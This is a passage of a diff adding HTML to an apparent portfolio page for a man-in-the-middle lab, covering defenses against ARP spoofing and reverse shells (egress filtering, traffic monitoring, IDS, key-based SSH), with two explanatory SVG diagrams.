+        <h2><svg class="icon icon-head" viewBox="0 0 512 512" aria-hidden="true" focusable="false"><path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.6 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0zm0 66.8l0 378.1C394 378 431.1 230.1 432 141.4L256 66.8s0 0 0 0z"/></svg>Detection and prevention</h2>
+        <p>
+          Every attack here has a defense documented beside it, because the point was
+          to understand both sides.
+        </p>
+        <p><strong>Against ARP spoofing:</strong> strong, unique device and account passwords;
+          WPA2/WPA3 encryption on Wi-Fi networks; minimizing broadcasted handshake traffic; and
+          restricting port forwarding to what is actually needed, since an open port is an open
+          door regardless of what else is secured.</p>
+        <p><strong>Against the reverse shell:</strong> traffic analysis for unusual outbound
+          connections to unfamiliar hosts or ports; firewall rules that restrict outbound traffic
+          rather than only inbound; endpoint protection that can recognize and block a reverse
+          shell payload before it runs; and an intrusion detection system to flag the pattern even
+          when the payload itself is novel.</p>
+
+        <figure class="diagram">
+          <svg viewBox="0 0 640 200" role="img" aria-labelledby="mon-diagram-title mon-diagram-desc">
+            <title id="mon-diagram-title">Traffic monitoring flags connections that do not belong</title>
+            <desc id="mon-diagram-desc">
+              Network traffic passes a monitoring point. Traffic to a known, expected destination
+              continues normally. Traffic to an unfamiliar host or port, the pattern a reverse
+              shell produces, is flagged and blocked instead of being left to leave the network.
+            </desc>
+            <defs>
+              <marker id="mon-arrow-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="mon-arrow-attack" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-attack" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+            </defs>
+
+            <rect class="diagram-node" x="20" y="70" width="160" height="60" rx="4" />
+            <text class="diagram-node-title" x="100" y="96" text-anchor="middle">Device</text>
+            <text class="diagram-node-meta" x="100" y="114" text-anchor="middle">on the network</text>
+
+            <rect class="diagram-node" x="240" y="70" width="160" height="60" rx="4" />
+            <text class="diagram-node-title" x="320" y="96" text-anchor="middle">Monitoring</text>
+            <text class="diagram-node-meta" x="320" y="114" text-anchor="middle">traffic analysis / IDS</text>
+
+            <rect class="diagram-node" x="460" y="10" width="160" height="56" rx="4" />
+            <text class="diagram-node-title" x="540" y="34" text-anchor="middle">Expected</text>
+            <text class="diagram-node-meta" x="540" y="52" text-anchor="middle">known destination</text>
+
+            <rect class="diagram-node" x="460" y="134" width="160" height="56" rx="4" />
+            <text class="diagram-node-title" x="540" y="158" text-anchor="middle">Unfamiliar</text>
+            <text class="diagram-node-meta" x="540" y="176" text-anchor="middle">unknown host or port</text>
+
+            <path class="diagram-line-ok" marker-end="url(#mon-arrow-ok)" d="M180 100 L240 100" />
+            <path class="diagram-line-ok" marker-end="url(#mon-arrow-ok)" d="M400 95 Q430 70 460 42" />
+            <path class="diagram-line-attack" marker-end="url(#mon-arrow-attack)" d="M400 110 Q430 140 460 162" />
+            <circle cx="460" cy="162" r="7" fill="none" class="diagram-line-attack" />
+          </svg>
+          <ul class="diagram-legend">
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok" x1="0" y1="5" x2="28" y2="5" /></svg>Ordinary traffic: reaches its expected destination</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-attack" x1="0" y1="5" x2="28" y2="5" /></svg>Unusual outbound traffic: flagged, then blocked rather than left to leave</li>
+          </ul>
+          <figcaption>What traffic analysis and an intrusion detection system are watching for.</figcaption>
+        </figure>
+
+        <figure class="diagram">
+          <svg viewBox="0 0 640 210" role="img" aria-labelledby="fw-diagram-title fw-diagram-desc">
+            <title id="fw-diagram-title">Minimal open ports and outbound rules close the door the attack used</title>
+            <desc id="fw-diagram-desc">
+              A firewall with egress rules restricts outbound connections the same way it
+              restricts inbound ones, and port forwarding is limited to the ports a device
+              actually needs, so neither the reverse shell's outbound connection nor an
+              unnecessary open port has anywhere to go.
+            </desc>
+            <defs>
+              <marker id="fw-arrow-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="fw-arrow-attack" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-attack" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+            </defs>
+
+            <rect class="diagram-node" x="20" y="77" width="150" height="56" rx="4" />
+            <text class="diagram-node-title" x="95" y="101" text-anchor="middle">Device</text>
+            <text class="diagram-node-meta" x="95" y="119" text-anchor="middle">on the network</text>
+
+            <rect class="diagram-node" x="210" y="77" width="170" height="56" rx="4" />
+            <text class="diagram-node-title" x="295" y="101" text-anchor="middle">Firewall</text>
+            <text class="diagram-node-meta" x="295" y="119" text-anchor="middle">egress rules, minimal ports</text>
+
+            <rect class="diagram-node" x="440" y="16" width="180" height="56" rx="4" />
+            <text class="diagram-node-title" x="530" y="40" text-anchor="middle">Needed</text>
+            <text class="diagram-node-meta" x="530" y="58" text-anchor="middle">the few ports in use</text>
+
+            <rect class="diagram-node" x="440" y="140" width="180" height="56" rx="4" />
+            <text class="diagram-node-title" x="530" y="164" text-anchor="middle">Everything else</text>
+            <text class="diagram-node-meta" x="530" y="182" text-anchor="middle">in or out</text>
+
+            <path class="diagram-line-ok" marker-end="url(#fw-arrow-ok)" d="M170 105 L210 105" />
+            <path class="diagram-line-ok" marker-end="url(#fw-arrow-ok)" d="M380 95 Q410 60 440 44" />
+            <path class="diagram-line-attack" marker-end="url(#fw-arrow-attack)" d="M380 115 Q410 150 440 168" />
+            <circle cx="440" cy="168" r="7" fill="none" class="diagram-line-attack" />
+          </svg>
+          <ul class="diagram-legend">
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok" x1="0" y1="5" x2="28" y2="5" /></svg>Only the ports a device actually needs are forwarded or allowed out</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-attack" x1="0" y1="5" x2="28" y2="5" /></svg>Every other port, inbound or outbound, is closed by default</li>
+          </ul>
+          <figcaption>Egress filtering closes the same outbound path the reverse shell relied on.</figcaption>
+        </figure>
+
+        <p>
+          Network-wide, the same monitoring and firewall discipline is reinforced by DNSSEC
+          against DNS spoofing, key-based SSH authentication in place of passwords with
+          brute-force protection such as fail2ban behind it, systems kept patched against known
+          vulnerabilities, and routine scanning for the kind of remote-access trojans a reverse
+          shell is a form of. None of these measures requires knowing an attack is coming; they
+          are what makes an attack visible, or impossible, if one does.
+        </p>
+      </section>
+
+          </div>
+        </div>
+      </details>
+        </div>
+
+        <aside class="project-rail" id="timeline" aria-labelledby="tl-mitm-title">
+          <div class="section-head">
+            <h2 id="tl-mitm-title"><svg class="icon icon-head" viewBox="0 0 448 512" aria-hidden="true" focusable="false"><path d="M80 104a24 24 0 1 0 0-48 24 24 0 1 0 0 48zm80-24c0 32.8-19.7 61-48 73.3l0 87.8c18.8-10.9 40.7-17.1 64-17.1l96 0c35.3 0 64-28.7 64-64l0-6.7C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3l0 6.7c0 70.7-57.3 128-128 128l-96 0c-35.3 0-64 28.7-64 64l0 6.7c28.3 12.3 48 40.5 48 73.3c0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3l0-6.7 0-198.7C19.7 141 0 112.8 0 80C0 35.8 35.8 0 80 0s80 35.8 80 80zm232 0a24 24 0 1 0 -48 0 24 24 0 1 0 48 0zM80 456a24 24 0 1 0 0-48 24 24 0 1 0 0 48z"/></svg>Project timeline</h2>
+            <p>There is no public repository for this work; the one entry below is the report and demonstration.</p>
+          </div>
+          <div data-timeline data-project="mitm-lab" data-hide-project-chip></div>
+        </aside>
+      </div>
+    </div>
+  </main>
+  <footer class="site-footer" data-site-footer></footer>
+  <script type="module" src="/js/site.js"></script>
+</body>
+</html>
